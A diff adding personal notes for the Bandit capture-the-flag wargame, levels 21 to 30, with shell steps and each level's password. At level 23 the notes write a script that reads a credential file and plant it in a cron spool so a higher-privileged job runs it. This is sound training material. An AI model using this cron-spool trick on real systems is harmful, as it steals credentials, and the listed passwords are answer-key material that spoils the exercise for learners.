@@ -208,4 +208,56 @@ in T2: ./suconnect 12345, then paste bandit20 pass
 pass: EeoULMCra2q0dSkYj561DX7s1CpBuOBt
 
 LEVEL21:
+cd /etc/cron.d
+ls
+cat cronjob_bandit22
+cat /usr/bin/cronjob_bandit22.sh
+pass: tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
 
+LEVEL22:
+cd /etc/cron.d
+ls
+cat cronjob_bandit23
+cat /usr/bin/cronjob_bandit23.sh
+echo I am user bandit23 | md5sum
+cat /tmp/<hash>
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+pass: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+
+LEVEL23:
+cd /etc/cron.d
+cat cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+cd /tmp
+mkdir myhack
+cd myhack
+nano script.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/myhack/password.txt
+cp script.sh /var/spool/bandit24/foo/
+(wait)
+
+cat /tmp/myhack/password.txt
+pass: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+
+
+LEVEL24:
+pass: iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+
+LEVEL25:
+pass: s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
+
+LEVEL26:
+pass: upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
+
+LEVEL27:
+pass: Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN
+
+LEVEL28:
+pass :4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7
+
+LEVEL29:
+pass : qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL
+
+LEVEL30:
+pass: fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy
